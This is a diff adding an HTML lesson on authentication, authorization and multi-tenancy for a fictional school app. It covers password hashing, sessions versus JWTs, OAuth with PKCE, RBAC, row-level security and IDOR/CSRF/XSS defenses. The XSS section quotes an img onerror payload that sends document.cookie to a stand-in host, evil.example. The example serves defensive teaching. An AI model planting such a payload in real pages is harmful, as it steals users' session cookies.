@@ -1,0 +1,197 @@
+<template id="tpl-auth" data-title="Auth, permissions and tenants" data-part="Part 1 · Foundations" data-order="40">
+  <h1>Auth, permissions and tenants</h1>
+  <p class="lede">A school product holds children's data for hundreds of separate customers, so "who is this, and what may they see?" is the most important question your backend answers. This lesson covers storing passwords, sessions versus JWTs, how "Sign in with Google" actually works, roles scoped to a district, school or class, keeping tenants apart, and the three bugs (IDOR, CSRF, XSS) that cause most real breaches.</p>
+
+  <h2>1. Two questions: who are you, and may you?</h2>
+  <p>It's 7:50am. Ms. Lee clicks <b>Sign in with Google</b> on PageTurn, then opens her class 4B. Two different checks happen:</p>
+  <ul>
+    <li><b>Authentication (AuthN)</b>: proving who she is. "This request comes from Ms. Lee, user <code>u-lee</code>." Passwords, Google sign-in and session cookies are all authentication.</li>
+    <li><b>Authorization (AuthZ)</b>: deciding what she may do. "Ms. Lee may grade submissions in class c1, but not see class c3 in another school." Roles, permissions and tenant checks are authorization.</li>
+  </ul>
+  <p>They fail differently. An authentication failure returns <code>401</code> ("log in"). An authorization failure returns <code>403</code> ("you can't"). Most breaches in B2B products aren't broken logins; they're <b>missing authorization checks</b> on a perfectly authenticated user.</p>
+
+  <h2>2. Storing passwords</h2>
+  <p>Some districts don't use Google, so PageTurn supports passwords for teachers. The rule: <b>never store the password</b>. Store something you can check a guess against but can't reverse.</p>
+  <p>A <b>hash function</b> turns input into a fixed-size fingerprint and can't be run backwards. But plain fast hashes like SHA-256 are the wrong tool: a single modern GPU computes billions of them per second, so an attacker with a stolen table can try every common password against every account in minutes. Two additions fix that:</p>
+  <ul>
+    <li><b>A salt</b>: a random value stored per user and mixed in before hashing. Two teachers with the password <code>Reading2026!</code> get different hashes, so an attacker can't crack everyone at once or use precomputed tables.</li>
+    <li><b>A deliberately slow hash</b>: <b>Argon2id</b>, <b>scrypt</b> or <b>bcrypt</b>, tuned so one check takes on the order of 100ms and uses memory. That's nothing for a login, and a disaster for someone trying a billion guesses.</li>
+  </ul>
+  <pre><code class="lang-js">// sign up
+const hash = await argon2.hash(password);          // "$argon2id$v=19$m=65536,t=3,p=4$&lt;salt&gt;$&lt;hash&gt;"
+await db.query('INSERT INTO credentials (user_id, password_hash) VALUES ($1, $2)', [userId, hash]);
+
+// log in
+const row = await db.oneOrNone('SELECT password_hash FROM credentials WHERE user_id = $1', [userId]);
+const ok = row &amp;&amp; await argon2.verify(row.password_hash, password);  // salt and settings are inside the string
+if (!ok) return res.status(401).json({ error: { code: 'invalid_credentials' } }); // same message for unknown email</code></pre>
+  <p>Also rate-limit login attempts per account and per IP, and give the same error for "no such email" and "wrong password" so attackers can't discover which emails have accounts.</p>
+
+  <h2>3. Staying logged in: sessions versus JWTs</h2>
+  <p>After she proves who she is once, every later request needs to carry that proof. Two common designs:</p>
+  <h3>Server-side sessions</h3>
+  <p>The server creates a random <b>session ID</b>, stores <code>sid → { userId: 'u-lee', expiresAt }</code> in Redis or the database, and sends the ID in a cookie (the <code>HttpOnly; Secure; SameSite</code> cookie from the first lesson). Each request, the server looks the ID up. The ID itself means nothing; it's a coat-check ticket.</p>
+  <h3>JWTs (JSON Web Tokens)</h3>
+  <p>A <b>JWT</b> is the claim itself, signed. Three base64 parts separated by dots: a header, a <b>payload</b> of claims, and a <b>signature</b> made with a key only the server has:</p>
+  <pre><code class="lang-json">{ "sub": "u-lee", "district": "d1", "roles": ["teacher:c1"], "iat": 1791617400, "exp": 1791618300 }</code></pre>
+  <p>Any server with the verification key can check the signature and trust the claims <b>without a database lookup</b>. That's the appeal: stateless verification, handy when many services need to know who the caller is.</p>
+  <p>The catch is <b>revocation</b>. A JWT is valid until <code>exp</code>, period. If Ms. Lee is removed from class 4B, or her laptop is stolen, a token that says <code>"roles": ["teacher:c1"]</code> keeps working until it expires. The usual compromise is a short-lived <b>access token</b> (5–15 minutes) plus a long-lived <b>refresh token</b> stored server-side that can be revoked, which brings back a lookup, just less often.</p>
+  <table class="tbl">
+    <thead><tr><th></th><th>Server session + cookie</th><th>JWT access token</th></tr></thead>
+    <tbody>
+      <tr><td>Check per request</td><td>Lookup in Redis/DB (~1ms)</td><td>Verify signature, no lookup</td></tr>
+      <tr><td>Log out / revoke now</td><td>Delete the session. Instant.</td><td>Hard: wait for expiry, or keep a denylist (a lookup again)</td></tr>
+      <tr><td>Permissions change</td><td>Next request sees it</td><td>Stale until the token is refreshed</td></tr>
+      <tr><td>Size on every request</td><td>~32 bytes</td><td>Hundreds of bytes to a few KB</td></tr>
+      <tr><td>Choose when</td><td>A web app talking to its own backend (most products)</td><td>Many services or third parties must verify identity; mobile/API clients; short expiry</td></tr>
+    </tbody>
+  </table>
+  <p>Sessions give you instant revocation at the cost of a lookup per request; JWTs give you lookup-free verification at the cost of stale permissions and hard revocation. For PageTurn's web app, sessions are the simpler, safer default. Never put permissions in a long-lived token and then rely on them for a school's data.</p>
+
+  <h2>4. "Sign in with Google": OAuth and OpenID Connect</h2>
+  <p>Most districts already give every teacher a Google or Microsoft account. With <b>single sign-on (SSO)</b>, PageTurn never sees a password at all; Google vouches for the user. The protocol is <b>OAuth 2.0</b> (a way to get permission from a user to access something) with <b>OpenID Connect (OIDC)</b> on top (a standard way to learn <i>who</i> the user is). The flow everyone should use is the <b>authorization code flow with PKCE</b>:</p>
+  <figure class="diagram">
+    <svg viewBox="0 0 720 400" role="img" aria-label="OAuth authorization code flow: browser goes to PageTurn, is redirected to Google, signs in, is redirected back with a code, PageTurn's server exchanges the code for an ID token directly with Google, verifies it and sets a session cookie.">
+      <defs>
+        <marker id="au-ah" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor"/></marker>
+        <marker id="au-ah-a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="var(--accent)"/></marker>
+      </defs>
+      <g font-size="13" text-anchor="middle">
+        <rect x="40" y="8" width="130" height="38" rx="8" fill="var(--accent-soft)" stroke="var(--accent)"/><text x="105" y="32" font-weight="600" fill="currentColor">Browser</text>
+        <rect x="295" y="8" width="130" height="38" rx="8" fill="var(--surface)" stroke="var(--line)" stroke-width="1.5"/><text x="360" y="32" font-weight="600" fill="currentColor">PageTurn server</text>
+        <rect x="550" y="8" width="130" height="38" rx="8" fill="var(--surface)" stroke="var(--line)" stroke-width="1.5"/><text x="615" y="32" font-weight="600" fill="currentColor">Google</text>
+        <g stroke="var(--line)" stroke-width="1.5" stroke-dasharray="4 4"><path d="M105 46 V 392"/><path d="M360 46 V 392"/><path d="M615 46 V 392"/></g>
+        <path d="M107 78 H 356" stroke="currentColor" stroke-width="1.5" marker-end="url(#au-ah)"/>
+        <text x="232" y="70" fill="currentColor">① GET /login/google</text>
+        <path d="M358 108 H 109" stroke="currentColor" stroke-width="1.5" stroke-dasharray="5 3" marker-end="url(#au-ah)"/>
+        <text x="232" y="100" fill="currentColor">② 302 → Google (state, PKCE)</text>
+        <path d="M107 142 H 611" stroke="currentColor" stroke-width="1.5" marker-end="url(#au-ah)"/>
+        <text x="360" y="134" fill="currentColor">③ accounts.google.com/…?client_id&amp;redirect_uri&amp;state&amp;code_challenge</text>
+        <rect x="560" y="156" width="110" height="40" rx="6" fill="var(--warn-soft)"/>
+        <text x="615" y="172" font-size="12" fill="var(--warn)">user signs in,</text>
+        <text x="615" y="188" font-size="12" fill="var(--warn)">consents</text>
+        <path d="M611 218 H 109" stroke="currentColor" stroke-width="1.5" stroke-dasharray="5 3" marker-end="url(#au-ah)"/>
+        <text x="360" y="210" fill="currentColor">④ 302 to pageturn.com/auth/callback?code=4/0Ab…&amp;state=…</text>
+        <path d="M107 250 H 356" stroke="currentColor" stroke-width="1.5" marker-end="url(#au-ah)"/>
+        <text x="232" y="242" fill="currentColor">⑤ GET /auth/callback?code…</text>
+        <path d="M364 282 H 611" stroke="var(--accent)" stroke-width="2" marker-end="url(#au-ah-a)"/>
+        <text x="488" y="274" fill="var(--accent)" font-weight="600">⑥ POST /token: code + secret + verifier</text>
+        <path d="M611 312 H 364" stroke="var(--accent)" stroke-width="2" stroke-dasharray="5 3" marker-end="url(#au-ah-a)"/>
+        <text x="488" y="304" fill="var(--accent)">ID token (signed JWT)</text>
+        <rect x="290" y="322" width="140" height="22" rx="5" fill="var(--ok-soft)"/>
+        <text x="360" y="338" font-size="12" fill="var(--ok)">⑦ verify, find user</text>
+        <path d="M358 370 H 109" stroke="var(--ok)" stroke-width="2" stroke-dasharray="5 3"/>
+        <path d="M118 365 L108 370 L118 375" stroke="var(--ok)" stroke-width="2" fill="none"/>
+        <text x="232" y="362" fill="var(--ok)" font-weight="600">⑧ Set-Cookie: sid=…</text>
+        <text x="487" y="370" font-size="12" fill="var(--muted)">server-to-server: the browser</text>
+        <text x="487" y="386" font-size="12" fill="var(--muted)">never sees the token exchange</text>
+      </g>
+    </svg>
+    <figcaption>The browser only ever carries a one-time code. The valuable exchange (⑥) happens directly between PageTurn's server and Google.</figcaption>
+  </figure>
+  <div class="trace">
+    <b>Trace · Ms. Lee signs in with Google</b>
+    <ol>
+      <li><p>She clicks the button: <code>GET /login/google</code>. PageTurn generates a random <code>state</code> (<code>q8Zt…</code>) and a PKCE <b>code verifier</b> (a random secret), stores both in a short-lived cookie, and redirects her to Google with <code>state</code> and a hash of the verifier (the <b>code challenge</b>).</p></li>
+      <li><p>Google shows its own login page. PageTurn is not involved; her Google password never touches PageTurn.</p></li>
+      <li><p>Google redirects back: <code>/auth/callback?code=4/0AbC…&amp;state=q8Zt…</code>. PageTurn checks <code>state</code> matches her cookie. <span class="ok">This blocks an attacker from planting their own login in her browser.</span></p></li>
+      <li><p>PageTurn's server calls Google's token endpoint directly with the code, its client secret and the code verifier. Google checks the verifier matches the challenge from step 1 (so a stolen code is useless) and returns an <b>ID token</b>.</p></li>
+      <li><p>PageTurn verifies the ID token's signature with Google's public keys, and checks <code>iss</code> (it's from Google), <code>aud</code> (it's meant for PageTurn) and <code>exp</code>. Claims: <code>sub: "1129…"</code> (Google's stable user ID), <code>email: "lee@lincoln-usd.org"</code>, <code>hd: "lincoln-usd.org"</code>.</p></li>
+      <li><p>It looks up the user by <code>(provider = 'google', sub = '1129…')</code>, not by email (emails get reused and renamed). Found <code>u-lee</code> in district <code>d1</code>, and <code>lincoln-usd.org</code> is d1's verified domain. <span class="yes">Creates a session, sets the cookie.</span> From here on it's the normal session flow.</p></li>
+    </ol>
+  </div>
+  <p>In practice you use a library or an identity provider (Auth0, Clerk, WorkOS, Cognito) for this, and for K-12 often a rostering provider like Clever or ClassLink that also tells you which classes each teacher has. What you must still own: mapping the external identity to <i>your</i> user and tenant, and deciding what they may do.</p>
+
+  <h2>5. Roles, permissions and scope</h2>
+  <p>Now authorization. A <b>permission</b> is an action on a type of thing: <code>submission:grade</code>, <code>report:read</code>. A <b>role</b> is a named bundle of permissions: a teacher can read classes, read and grade submissions, and read reports. This is <b>RBAC (role-based access control)</b>, and it keeps you from scattering <code>if (user.isTeacher)</code> checks across the code.</p>
+  <p>Roles alone aren't enough in a multi-tenant product. "Ms. Lee is a teacher" is useless. "Ms. Lee is a teacher <b>of class c1</b>" is what matters. So a role is <b>granted at a node of the tenant tree</b>, and covers everything beneath it:</p>
+  <figure class="diagram">
+    <svg viewBox="0 0 720 270" role="img" aria-label="Tenant tree: district d1 contains schools s1 and s2, which contain classes c1, c2 and c3. District d2 is separate. A district admin grant on d1 covers everything under d1; a principal grant on s1 covers c1 and c2; a teacher grant on c1 covers only c1.">
+      <g font-size="13" text-anchor="middle">
+        <rect x="20" y="10" width="500" height="250" rx="12" fill="none" stroke="var(--accent)" stroke-dasharray="6 4"/>
+        <text x="40" y="30" text-anchor="start" font-size="12" fill="var(--accent)">tenant: district d1 (Lincoln USD)</text>
+        <rect x="200" y="42" width="140" height="38" rx="8" fill="var(--surface)" stroke="var(--line)" stroke-width="1.5"/><text x="270" y="66" font-weight="600" fill="currentColor">district d1</text>
+        <rect x="70" y="120" width="160" height="38" rx="8" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="1.5"/><text x="150" y="144" font-weight="600" fill="currentColor">school s1</text>
+        <rect x="310" y="120" width="160" height="38" rx="8" fill="var(--surface)" stroke="var(--line)" stroke-width="1.5"/><text x="390" y="144" font-weight="600" fill="currentColor">school s2</text>
+        <rect x="40" y="200" width="96" height="38" rx="8" fill="var(--ok-soft)" stroke="var(--ok)" stroke-width="2"/><text x="88" y="224" font-weight="600" fill="currentColor">class c1</text>
+        <rect x="160" y="200" width="96" height="38" rx="8" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="1.5"/><text x="208" y="224" fill="currentColor">class c2</text>
+        <rect x="342" y="200" width="96" height="38" rx="8" fill="var(--surface)" stroke="var(--line)" stroke-width="1.5"/><text x="390" y="224" fill="currentColor">class c3</text>
+        <g stroke="var(--line)" stroke-width="1.5" fill="none"><path d="M240 80 L 150 120"/><path d="M300 80 L 390 120"/><path d="M130 158 L 88 200"/><path d="M170 158 L 208 200"/><path d="M390 158 V 200"/></g>
+        <rect x="560" y="42" width="140" height="38" rx="8" fill="var(--surface)" stroke="var(--line)" stroke-width="1.5"/><text x="630" y="66" font-weight="600" fill="currentColor">district d2</text>
+        <text x="630" y="98" font-size="12" fill="var(--muted)">another customer:</text>
+        <text x="630" y="114" font-size="12" fill="var(--muted)">no grant in d1 ever</text>
+        <text x="630" y="130" font-size="12" fill="var(--muted)">reaches here</text>
+        <g font-size="12" text-anchor="start">
+          <rect x="545" y="168" width="14" height="14" rx="3" fill="var(--ok-soft)" stroke="var(--ok)"/><text x="566" y="180" fill="currentColor">Ms. Lee: teacher @ c1</text>
+          <rect x="545" y="196" width="14" height="14" rx="3" fill="var(--accent-soft)" stroke="var(--accent)"/><text x="566" y="208" fill="currentColor">Mr. Ortiz: principal @ s1</text>
+          <rect x="545" y="224" width="14" height="14" rx="3" fill="none" stroke="var(--accent)" stroke-dasharray="4 3"/><text x="566" y="236" fill="currentColor">Dr. Shah: admin @ d1</text>
+        </g>
+      </g>
+    </svg>
+    <figcaption>A grant covers its node and everything below it. Mr. Ortiz sees c1 and c2, not c3. Nobody in d1 sees anything in d2.</figcaption>
+  </figure>
+  <p>So the check is three questions, and all must be yes for at least one of the user's grants: <b>what</b> (does the role include this permission?), <b>where</b> (is the resource under the grant's node?), and sometimes <b>whose</b> (a student may read her own submission, not a classmate's). Put it in one function and call it from every handler.</p>
+
+  <div data-lab="rbac-check"></div>
+
+  <h2>6. Keeping tenants apart</h2>
+  <p>Each district is a <b>tenant</b>: a separate customer whose data must never be visible to another. PageTurn has 300 of them in one system. Three ways to separate them:</p>
+  <table class="tbl">
+    <thead><tr><th>Model</th><th>How</th><th>Gives you</th><th>Costs you</th></tr></thead>
+    <tbody>
+      <tr><td>Shared tables</td><td>Every row has <code>district_id</code>; every query filters by it</td><td>Cheapest, simplest ops, easy cross-tenant analytics</td><td>One missing <code>WHERE</code> leaks data; noisy neighbors share capacity</td></tr>
+      <tr><td>Schema per tenant</td><td>Same database, one Postgres schema per district</td><td>Stronger separation, per-tenant restore</td><td>Migrations run 300 times; connection and catalog overhead</td></tr>
+      <tr><td>Database per tenant</td><td>Separate database (or cluster) per district</td><td>Strongest isolation, data residency, per-tenant scaling</td><td>Expensive, heavy ops; only practical for few, large tenants</td></tr>
+    </tbody>
+  </table>
+  <p>Most SaaS products, PageTurn included, use shared tables, sometimes with a dedicated database for one huge or regulated customer. Shared tables give you low cost at the price of relying on discipline, so you add layers of defense:</p>
+  <ul>
+    <li><b>Take the tenant from the session, never from the request.</b> The district is whatever <code>u-lee</code>'s session says, not a <code>?districtId=</code> parameter.</li>
+    <li><b>Scope queries in one place</b>: a data-access helper that adds <code>WHERE district_id = $tenant</code> automatically, so handlers can't forget.</li>
+    <li><b>Make the database enforce it</b> with Postgres <b>row-level security</b> (RLS): a policy that hides rows whose <code>district_id</code> doesn't match a setting the app sets per request. A forgotten <code>WHERE</code> then returns nothing instead of another district's students.</li>
+  </ul>
+  <pre><code class="lang-sql">ALTER TABLE students ENABLE ROW LEVEL SECURITY;
+CREATE POLICY tenant_isolation ON students
+  USING (district_id = current_setting('app.district_id'));
+-- per request, inside the transaction:  SET LOCAL app.district_id = 'd1';</code></pre>
+
+  <h2>7. The three bugs behind most breaches</h2>
+  <h3>IDOR: insecure direct object reference</h3>
+  <div class="trace">
+    <b>Trace · an IDOR</b>
+    <ol>
+      <li><p>Ms. Lee opens a report: <code>GET /api/reports/rpt_1041</code>. The handler checks she's logged in, loads report 1041, returns it.</p></li>
+      <li><p>Curious, she changes the URL to <code>rpt_1042</code>. The handler checks she's logged in (<span class="yes">yes</span>), loads 1042, returns it.</p></li>
+      <li><p>Report 1042 belongs to a school in another district. <span class="no">She just read 28 other children's reading levels.</span> A script can walk every ID in an afternoon.</p></li>
+    </ol>
+  </div>
+  <p>The fix is not unguessable IDs (they help, but leak eventually via logs and shared links). The fix is an <b>authorization check on the object</b>: load it, then <code>can(user, 'read', report)</code>, else <code>404</code>. Random IDs and RLS are extra layers.</p>
+  <h3>CSRF: cross-site request forgery</h3>
+  <p>A teacher, still logged in to PageTurn, visits a malicious page. That page contains a hidden form that auto-submits <code>POST https://app.pageturn.com/api/classes/c1/students/remove-all</code>. The browser used to attach PageTurn's cookie to any request <i>to</i> PageTurn, no matter which site started it, so the server saw an authenticated teacher. Defenses: <code>SameSite=Lax</code> (or <code>Strict</code>) cookies, which modern browsers respect by not sending the cookie on cross-site POSTs; never changing state with GET; and for sensitive actions, a <b>CSRF token</b> or requiring a custom header that cross-site forms can't set.</p>
+  <h3>XSS: cross-site scripting</h3>
+  <p>A student names their reading journal <code>&lt;img src=x onerror="fetch('https://evil.example?c='+document.cookie)"&gt;</code>. If the teacher's dashboard inserts that name into the page as HTML, the script runs <i>as the teacher</i>, inside PageTurn, with all her permissions. Defenses: frameworks like React escape text by default, so the danger is anything that bypasses it (<code>dangerouslySetInnerHTML</code>, rendering user-provided Markdown or HTML without a sanitizer); <code>HttpOnly</code> cookies so a script can't read the session; and a <b>Content Security Policy</b> header that blocks inline and third-party scripts.</p>
+  <p>And the classic one you already avoid by using parameters: <b>SQL injection</b>. Never build SQL by concatenating input; always <code>$1</code> placeholders.</p>
+
+  <div class="callout key"><span class="callout-label">Say it in the interview</span><p>"Teachers sign in with Google or Microsoft through OIDC, or through Clever for rostering; we map the external subject ID to our user and district, then use a server-side session in an HttpOnly, SameSite cookie, so we can revoke instantly. Authorization is one function, can(user, action, resource), with roles granted at district, school or class level. Tenancy is shared tables with district_id on every row, the tenant taken from the session, and Postgres row-level security as a backstop. Every object fetch is followed by an authorization check, which is what prevents IDOR."</p></div>
+
+  <div class="callout warn"><span class="callout-label">Common mistake</span><p><b>Checking the role but not the object.</b> <code>if (user.role === 'teacher') return getSubmission(req.params.id)</code> is authentication plus a role check, and it's still an IDOR: every teacher in every district can read every submission by changing the ID. Always authorize against the specific resource you loaded: is this teacher a teacher <i>of the class that owns this submission</i>?</p></div>
+
+  <div data-quiz='[
+    {"q":"A logged-in teacher requests a class she is not assigned to. Which status code and which check failed?","o":["401, authentication","403 (or 404), authorization","400, validation","500, server error"],"a":1,"why":"We know who she is (authentication passed). She lacks permission on this resource, an authorization failure: 403, or 404 if you prefer not to reveal that the class exists."},
+    {"q":"Why use Argon2id or bcrypt instead of SHA-256 for passwords?","o":["SHA-256 is reversible","They are deliberately slow and salted, so each guess costs an attacker real time","They produce shorter hashes","They are required by OAuth"],"a":1,"why":"SHA-256 isn&#39;t reversible, but it&#39;s fast: billions of guesses per second on a GPU. Slow, salted, memory-hard hashes make a stolen table expensive to crack, one account at a time."},
+    {"q":"A district removes Ms. Lee from class 4B. Her app uses a JWT access token that lists her classes and expires in 24 hours. What happens?","o":["She loses access immediately","She keeps access to 4B until the token expires, unless you add a denylist or check the database","The token becomes invalid because the database changed","Google revokes it"],"a":1,"why":"A JWT is valid until exp; nothing on the server is consulted. That&#39;s the revocation problem. Use short-lived access tokens, check sensitive permissions against the database, or use server-side sessions."},
+    {"q":"In the OAuth code flow, why does PageTurn&#39;s server exchange the code with Google directly instead of receiving the token in the browser redirect?","o":["It is faster","The code is one-time and useless without the client secret and PKCE verifier, so a code leaked through the URL or history can&#39;t be used","Browsers can&#39;t parse JSON","Google requires a POST"],"a":1,"why":"URLs leak (history, logs, referrers). The code alone is worthless; only the server holding the secret and verifier can redeem it, over a direct server-to-server call."},
+    {"q":"Which change most directly prevents IDOR on GET /api/reports/:id?","o":["Use UUIDs instead of numbers","After loading the report, check can(user, read, report) and return 404 if not","Require HTTPS","Add rate limiting"],"a":1,"why":"IDOR is a missing object-level authorization check. Random IDs and rate limits only slow an attacker down; the check stops them."},
+    {"q":"PageTurn uses shared tables. What is the best backstop against a developer forgetting WHERE district_id = ?","o":["Code review only","Postgres row-level security keyed on a per-request tenant setting","A separate database user per teacher","Encrypting the district_id column"],"a":1,"why":"RLS makes the database itself hide rows from other tenants, so one missing filter returns nothing instead of leaking data. Pair it with a data-access helper that always adds the filter."}
+  ]'></div>
+
+  <h2>Recap</h2>
+  <ul>
+    <li><b>AuthN</b> = who you are (401). <b>AuthZ</b> = what you may do (403). Most breaches are missing AuthZ.</li>
+    <li>Store passwords with a slow, salted hash (Argon2id, scrypt, bcrypt); rate-limit logins; same error for unknown email and wrong password.</li>
+    <li><b>Sessions</b> give instant revocation with a lookup; <b>JWTs</b> verify without a lookup but are hard to revoke. Default to sessions for your own web app.</li>
+    <li>"Sign in with Google" is OAuth + OIDC: redirect, one-time code, server-to-server exchange with PKCE, verify the ID token, map <code>sub</code> to your user.</li>
+    <li>Roles are granted <b>at a node</b> of the tenant tree; check what, where and whose in one <code>can()</code> function.</li>
+    <li>Shared-table multi-tenancy: tenant from the session, scoped queries, row-level security. Defend against IDOR (object checks), CSRF (SameSite, no GET writes) and XSS (escaping, HttpOnly, CSP).</li>
+  </ul>
+</template>
